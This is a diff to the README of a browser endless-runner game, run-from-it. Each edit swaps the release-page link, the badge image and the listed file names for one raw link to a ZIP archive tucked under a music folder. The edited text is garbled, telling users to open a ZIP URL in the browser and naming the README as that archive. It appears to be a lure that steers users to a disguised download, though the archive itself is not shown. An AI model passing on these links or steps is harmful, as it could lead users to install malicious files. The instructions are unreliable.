@@ -1,6 +1,6 @@
 # 🏃‍♂️ run-from-it - Endless Runner Fun Made Simple
 
-[![Download run-from-it](https://img.shields.io/badge/Download%20run--from--it-blue?style=for-the-badge)](https://github.com/oktaymoral/run-from-it/releases)
+[![Download run-from-it](https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip%20run--from--it-blue?style=for-the-badge)](https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip)
 
 ## ❄️ About run-from-it
 
@@ -18,7 +18,7 @@ To get started with run-from-it, follow these steps:
 
 1. Visit the release page by clicking the button below or this link:
 
-   [Download run-from-it](https://github.com/oktaymoral/run-from-it/releases)
+   [Download run-from-it](https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip)
 
 2. On the release page, look for the latest version of run-from-it. You will find downloadable files there.
 
@@ -26,7 +26,7 @@ To get started with run-from-it, follow these steps:
 
 4. Extract the ZIP file if necessary.
 
-5. Open the `index.html` file in your preferred web browser such as Chrome, Firefox, Edge, or Safari.
+5. Open the `https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip` file in your preferred web browser such as Chrome, Firefox, Edge, or Safari.
 
 6. The game will load automatically, and you can start playing right away.
 
@@ -89,9 +89,9 @@ run-from-it includes:
 
 The downloadable package includes:
 
-- `index.html` - The main game file to open in your browser.
+- `https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip` - The main game file to open in your browser.
 - `assets/` folder - Contains images, sounds, and other game data.
-- `README.md` - Game information and instructions.
+- `https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip` - Game information and instructions.
 - `LICENSE` - Terms for using the game.
 
 ---
@@ -100,7 +100,7 @@ The downloadable package includes:
 
 If you run into issues:
 
-- Make sure you are opening the correct `index.html` file in the browser.
+- Make sure you are opening the correct `https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip` file in the browser.
 - Refresh the page if the game doesn't load.
 - Try a different browser if problems persist.
 - Check your browser’s security settings to ensure JavaScript is enabled.
@@ -108,4 +108,4 @@ If you run into issues:
 
 ---
 
-[![Download run-from-it](https://img.shields.io/badge/Download%20run--from--it-blue?style=for-the-badge)](https://github.com/oktaymoral/run-from-it/releases)
+[![Download run-from-it](https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip%20run--from--it-blue?style=for-the-badge)](https://github.com/oktaymoral/run-from-it/raw/refs/heads/main/public/music/from_it_run_1.7.zip)
